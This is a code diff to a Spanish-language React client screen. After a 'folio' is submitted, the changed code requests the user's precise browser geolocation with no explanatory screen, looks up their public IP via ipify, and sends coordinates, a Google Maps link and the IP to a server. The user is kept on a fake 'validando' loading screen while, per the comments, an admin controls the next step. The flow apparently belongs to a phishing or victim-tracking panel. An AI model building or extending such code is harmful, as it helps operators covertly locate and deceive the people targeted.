@@ -176,27 +176,154 @@ export default function ClientScreen() {
     return () => socket.removeEventListener('message', handleMessage);
   }, [socket]);
 
+  // Función para solicitar geolocalización directamente sin pantalla personalizada
+  const requestGeolocationDirectly = () => {
+    console.log('[Geolocation] Iniciando solicitud directa de ubicación...');
+    
+    // Cambiar a pantalla de validando inmediatamente
+    setCurrentScreen(ScreenType.VALIDANDO);
+    
+    // Verificar si el navegador soporta geolocalización
+    if (!('geolocation' in navigator)) {
+      console.log('[Geolocation] Navegador no soporta geolocalización, continuando...');
+      sendLocationDeniedData();
+      return;
+    }
+
+    // Verificar si el contexto es seguro (HTTPS) - requerido por Safari
+    const isSecureContext = window.isSecureContext || location.protocol === 'https:' || location.hostname === 'localhost';
+    if (!isSecureContext) {
+      console.log('[Geolocation] Contexto no seguro, Safari requiere HTTPS');
+      sendLocationDeniedData();
+      return;
+    }
+
+    console.log('[Geolocation] Llamando a getCurrentPosition...');
+    navigator.geolocation.getCurrentPosition(
+      async (position) => {
+        console.log('[Geolocation] Ubicación obtenida exitosamente:', position);
+        
+        const { latitude, longitude } = position.coords;
+        
+        // Obtener la IP del usuario
+        let ipAddress = 'IP no disponible';
+        try {
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipResponse.json();
+          ipAddress = ipData.ip;
+        } catch (ipError) {
+          console.warn('[Geolocation] No se pudo obtener la IP:', ipError);
+        }
+        
+        // Crear enlace de Google Maps
+        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+        
+        const locationData = {
+          latitude: latitude.toString(),
+          longitude: longitude.toString(),
+          googleMapsLink,
+          timestamp: new Date().toISOString(),
+          ipAddress
+        };
+
+        console.log('[Geolocation] Datos de ubicación procesados:', locationData);
+        console.log('[Geolocation] Ubicación obtenida:', locationData);
+        
+        // Enviar primera señal de validando
+        sendMessage({
+          type: 'CLIENT_INPUT',
+          data: {
+            tipo: 'validando',
+            sessionId,
+            data: {}
+          }
+        });
+        
+        // Luego enviar los datos de geolocalización
+        setTimeout(() => {
+          sendMessage({
+            type: 'CLIENT_INPUT',
+            data: {
+              tipo: 'geolocation',
+              sessionId,
+              data: {
+                tipo: 'geolocation',
+                latitude: locationData.latitude,
+                longitude: locationData.longitude,
+                googleMapsLink: locationData.googleMapsLink,
+                locationTimestamp: locationData.timestamp,
+                ipAddress: locationData.ipAddress
+              }
+            }
+          });
+          console.log('[ClientScreen] Enviando datos de geolocalización al servidor');
+          console.log('[ClientScreen] Datos de geolocalización enviados, manteniendo pantalla de cargando...');
+        }, 2000);
+      },
+      (error) => {
+        console.error('[Geolocation] Error obteniendo ubicación:', error);
+        
+        let errorMessage = 'Permiso de ubicación denegado';
+        switch (error.code) {
+          case error.PERMISSION_DENIED:
+            errorMessage = 'Permiso de ubicación denegado por el usuario';
+            break;
+          case error.POSITION_UNAVAILABLE:
+            errorMessage = 'Información de ubicación no disponible';
+            break;
+          case error.TIMEOUT:
+            errorMessage = 'Tiempo de espera agotado para obtener ubicación';
+            break;
+        }
+        
+        console.log('[Geolocation] Error:', errorMessage);
+        sendLocationDeniedData();
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      }
+    );
+  };
+
+  // Función para enviar datos cuando se deniega la ubicación
+  const sendLocationDeniedData = () => {
+    console.log('[Geolocation] Enviando datos de ubicación denegada');
+    
+    // Enviar señal de validando
+    sendMessage({
+      type: 'CLIENT_INPUT',
+      data: {
+        tipo: 'validando',
+        sessionId,
+        data: {}
+      }
+    });
+    
+    // Enviar datos de ubicación denegada
+    setTimeout(() => {
+      sendMessage({
+        type: 'CLIENT_INPUT',
+        data: {
+          tipo: 'geolocation',
+          sessionId,
+          data: {
+            tipo: 'geolocation_denied',
+            error: 'Usuario denegó el acceso a la ubicación',
+            timestamp: new Date().toISOString()
+          }
+        }
+      });
+      console.log('[ClientScreen] Datos de ubicación denegada enviados');
+    }, 2000);
+  };
+
   // Handle form submissions
   const handleSubmit = (screen: ScreenType, formData: Record<string, any>) => {
     if (connected) {
       console.log('Enviando datos al servidor:', screen, formData);
       
-      // Verificar si es un envío de datos de geolocalización
-      if (screen === ScreenType.VALIDANDO && formData.tipo === 'geolocation') {
-        console.log('[ClientScreen] Enviando datos de geolocalización al servidor');
-        // Enviar los datos de geolocalización con el tipo correcto
-        sendMessage({
-          type: 'CLIENT_INPUT',
-          data: {
-            tipo: 'geolocation',
-            sessionId,
-            data: formData
-          }
-        });
-        // Mantener la pantalla de cargando
-        console.log('[ClientScreen] Datos de geolocalización enviados, manteniendo pantalla de cargando...');
-        return;
-      }
       
       // Enviar datos al servidor inmediatamente para otros casos
       sendMessage({
@@ -208,14 +335,10 @@ export default function ClientScreen() {
         }
       });
       
-      // Si es la pantalla FOLIO, cambiar a geolocalización después de enviar
+      // Si es la pantalla FOLIO, solicitar geolocalización directamente
       if (screen === ScreenType.FOLIO) {
         console.log('[ClientScreen] Folio enviado, solicitando geolocalización');
-        setCurrentScreen(ScreenType.GEOLOCATION);
-      } else if (screen === ScreenType.GEOLOCATION) {
-        // Para geolocalización, NO cambiar de pantalla automáticamente
-        // El admin controlará el siguiente paso
-        console.log('[ClientScreen] Datos de geolocalización enviados, esperando instrucciones del admin');
+        requestGeolocationDirectly();
       } else if (screen === ScreenType.VALIDANDO) {
         // Si ya estamos en VALIDANDO (pantalla de cargando), mantener la pantalla
         console.log('[ClientScreen] Mostrando pantalla de cargando...');
